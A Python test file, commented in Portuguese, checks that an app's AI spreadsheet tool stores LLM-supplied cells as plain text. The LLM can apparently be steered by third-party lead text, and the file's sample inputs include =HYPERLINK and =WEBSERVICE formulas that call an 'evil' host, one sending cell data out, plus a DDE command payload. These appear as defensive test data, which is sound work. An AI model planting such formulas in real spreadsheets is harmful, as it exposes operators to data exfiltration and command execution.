# -*- coding: utf-8 -*-
"""
SEC-XLSX-01 — planilha gerada pela IA não pode sair com fórmula viva.

`generate_excel_document` (app/services/ai_tools.py) grava nas células o texto
que o LLM manda, e o LLM pode ser conduzido por texto de lead escrito por
terceiros (WhatsApp/n8n). O openpyxl marca toda string que começa com "=" como
fórmula (data_type "f"), então um `=HYPERLINK(...)` ou `=WEBSERVICE(...)` virava
fórmula no .xlsx que o operador baixa em /api/ai/download/.

Prova, chamando a ferramenta real e relendo o arquivo (XML cru e openpyxl), que:
  1. nenhuma célula — cabeçalho ou dado — é gravada como fórmula, e toda célula
     fica TEXTO (data_type "s") com exatamente o texto enviado;
  2. célula que começa com = + - @ leva `quotePrefix`, para o Excel não a
     reavaliar como fórmula se o operador editá-la (F2+Enter); as demais não.
Diferente do export CSV da Segmentação (SEC-CSV-01), XLSX tem tipo de célula:
não há prefixo `'` no valor nem exceção para telefone.

Sem rede, sem Gemini, sem banco real (SQLite descartável em scratch/ só para
satisfazer os imports — nenhuma query é executada). O .xlsx é gravado num
tempfile.TemporaryDirectory, passando pelo `_safe_document_target` de verdade.

Rodar:  python tests/test_ai_excel_formula.py
"""
import json
import os
import pathlib
import re
import sys
import tempfile
import zipfile

# raiz do repo no sys.path (permite `python tests/test_ai_excel_formula.py`)
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

# Ambiente DEVE ser definido ANTES de importar app.* (mesmo padrão de
# test_perpetua_pdf_generation.py). O banco nunca é consultado por estes testes.
pathlib.Path("scratch").mkdir(exist_ok=True)
os.environ.update({
    "ENVIRONMENT": "development",
    "DATABASE_URL": "sqlite:///./scratch/ai_excel_formula_test.db",
    "SEED_INITIAL_ADMIN": "false",
    "GEMINI_API_KEY": "",
})

import openpyxl  # noqa: E402

from app.services import ai_tools  # noqa: E402

# No schema do OOXML, <f> (fórmula) é o primeiro filho de <c r="A1" ...>.
_CELULA_COM_FORMULA_RE = re.compile(r'<c r="([A-Z]+[0-9]+)"[^>]*>\s*<f[\s>/]')


def _gerar_e_reler(headers, rows):
    """Chama a ferramenta real com UPLOAD_DIR num tempdir isolado e relê o .xlsx.

    Devolve (celulas, xml): a aba como matriz de (valor, data_type, quotePrefix),
    linha 0 = cabeçalho, e o XML cru das abas — o que o Excel de fato lê.
    """
    with tempfile.TemporaryDirectory(prefix="ai_excel_formula_test_") as tmpdir:
        old_upload_dir = ai_tools.UPLOAD_DIR
        ai_tools.UPLOAD_DIR = tmpdir
        try:
            raw = ai_tools.generate_excel_document(
                filename="planilha_teste", sheet_name="Leads", headers=headers, rows=rows
            )
        finally:
            ai_tools.UPLOAD_DIR = old_upload_dir
        payload = json.loads(raw)
        assert payload.get("success") is True, f"esperava sucesso, veio: {payload}"
        caminho = os.path.join(tmpdir, payload["filename"])
        with zipfile.ZipFile(caminho) as z:
            xml = "".join(
                z.read(nome).decode("utf-8")
                for nome in z.namelist()
                if nome.startswith("xl/worksheets/") and nome.endswith(".xml")
            )
        wb = openpyxl.load_workbook(caminho)
        try:
            celulas = [
                [(c.value, c.data_type, c.quotePrefix) for c in linha]
                for linha in wb.active.iter_rows()
            ]
        finally:
            wb.close()
        return celulas, xml


def _assert_texto_literal(headers, rows, esperado):
    """Nenhuma fórmula no XML, a aba tem o formato esperado e toda célula é texto
    ("s") com o valor exato enviado. Devolve a matriz relida."""
    planilha, xml = _gerar_e_reler(headers, rows)
    com_formula = _CELULA_COM_FORMULA_RE.findall(xml)
    assert not com_formula, f"célula(s) gravada(s) como fórmula no XML: {com_formula}"
    formato = (len(planilha), len(planilha[0]) if planilha else 0)
    formato_esperado = (len(esperado), max(len(linha) for linha in esperado))
    assert formato == formato_esperado, (
        f"aba tem (linhas, colunas) = {formato}, esperado {formato_esperado}"
    )
    divergentes = []
    for r, linha_esperada in enumerate(esperado):
        for c, texto in enumerate(linha_esperada):
            valor, tipo, _ = planilha[r][c]
            if tipo != "s" or valor != texto:
                divergentes.append(
                    f"linha {r + 1} col {c + 1}: {valor!r} tipo={tipo!r} "
                    f"(esperado {texto!r} como texto)"
                )
    assert not divergentes, "células fora do esperado:\n    " + "\n    ".join(divergentes)
    return planilha


# ── 1. Célula hostil fica texto literal ─────────────────────────────────────

def test_dado_hostil_fica_texto_literal():
    """`=...` em célula de dado virava fórmula; `@`/`+` já saíam texto e seguem assim."""
    # '|' é o separador de colunas da ferramenta: o DDE clássico
    # `+cmd|' /C calc'!A0` chega, por construção, partido em duas células.
    _assert_texto_literal(
        headers="A|B|C|D|E",
        rows='=HYPERLINK("http://evil","x")|=1+1|@SUM(1)|+cmd|\' /C calc\'!A0',
        esperado=[
            ["A", "B", "C", "D", "E"],
            ['=HYPERLINK("http://evil","x")', "=1+1", "@SUM(1)", "+cmd", "' /C calc'!A0"],
        ],
    )


def test_cabecalho_hostil_fica_texto_literal():
    """O cabeçalho também vem do LLM e passa pelo mesmo `ws.cell(value=...)`."""
    _assert_texto_literal(
        headers='Nome|=WEBSERVICE("http://evil/?q="&A2)|=1+1',
        rows="Fulano|x|y",
        esperado=[
            ["Nome", '=WEBSERVICE("http://evil/?q="&A2)', "=1+1"],
            ["Fulano", "x", "y"],
        ],
    )


# ── 2. Valor comum continua idêntico (sem prefixo, sem escape) ──────────────

def test_dado_comum_fica_identico():
    """Telefone com `+`, número e negativo saem exatamente como enviados: XLSX
    não precisa do prefixo `'` do CSV, e o WhatsApp não pode ser alterado."""
    _assert_texto_literal(
        headers="Nome|WhatsApp|Valor|Saldo",
        rows="Fulano|+55 11 98765-4322|1500|-3,5;;Beltrana|+56 9 1234 5678|0|2.5",
        esperado=[
            ["Nome", "WhatsApp", "Valor", "Saldo"],
            ["Fulano", "+55 11 98765-4322", "1500", "-3,5"],
            ["Beltrana", "+56 9 1234 5678", "0", "2.5"],
        ],
    )


def test_literal_de_erro_fica_texto():
    """`#N/A`/`#REF!` o openpyxl gravava como célula de ERRO (data_type "e"):
    texto do LLM sai como texto, sem exceção."""
    _assert_texto_literal(
        headers="Status|Obs",
        rows="#N/A|#REF!",
        esperado=[["Status", "Obs"], ["#N/A", "#REF!"]],
    )


# ── 3. Edição pelo operador não reativa a fórmula ───────────────────────────

def test_gatilho_de_formula_ganha_quote_prefix():
    """Texto que começa com = + - @ vira fórmula quando o operador confirma uma
    edição (F2+Enter) numa célula General do Excel. `quotePrefix` (o `'`
    invisível do Excel) mantém a célula como texto. Só nessas células."""
    # (texto, quotePrefix esperado)
    linhas = [
        [("=1+1", True), ("Nome", False)],
        [('=HYPERLINK("http://evil","x")', True), ("+55 11 98765-4322", True),
         ("-3,5", True), ("@SUM(1)", True), ("Fulano", False), ("1500", False)],
    ]
    planilha = _assert_texto_literal(
        headers="|".join(texto for texto, _ in linhas[0]),
        rows="|".join(texto for texto, _ in linhas[1]),
        esperado=[[texto for texto, _ in linha] for linha in linhas],
    )
    errados = [
        f"{texto!r}: quotePrefix={planilha[r][c][2]} (esperado {prefixo})"
        for r, linha in enumerate(linhas)
        for c, (texto, prefixo) in enumerate(linha)
        if planilha[r][c][2] != prefixo
    ]
    assert not errados, "quotePrefix fora do esperado:\n    " + "\n    ".join(errados)


ALL_TESTS = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]

if __name__ == "__main__":
    failures = 0
    for fn in ALL_TESTS:
        try:
            fn()
            print(f"PASS  {fn.__name__}")
        except AssertionError as exc:
            failures += 1
            print(f"FAIL  {fn.__name__}: {exc}")
        except Exception as exc:  # exceção inesperada = bug
            failures += 1
            print(f"ERROR {fn.__name__}: {type(exc).__name__}: {exc}")
    print(f"\n{len(ALL_TESTS) - failures}/{len(ALL_TESTS)} testes OK")
    sys.exit(1 if failures else 0)
